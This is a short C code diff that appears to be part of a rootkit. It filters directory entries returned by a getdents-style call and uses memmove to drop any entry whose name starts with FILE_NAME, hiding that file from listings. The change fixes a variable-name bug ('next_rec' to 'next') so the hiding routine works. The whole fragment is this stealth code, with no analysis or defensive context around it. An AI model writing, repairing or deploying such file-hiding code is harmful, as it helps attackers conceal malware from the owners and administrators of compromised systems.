@@ -36,8 +36,8 @@ next: next    dirp
     int size = curr->d_reclen;
 
     if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
-      char *next = (char *)curr + size;
-      int len = (uintptr_t)dirp + nob - (uintptr_t)next_rec;
+      char *next = (char*)curr + size;
+      int len = (uintptr_t)dirp + nob - (uintptr_t)next;
       memmove(curr, next, len);
       nob -= size;
       continue;
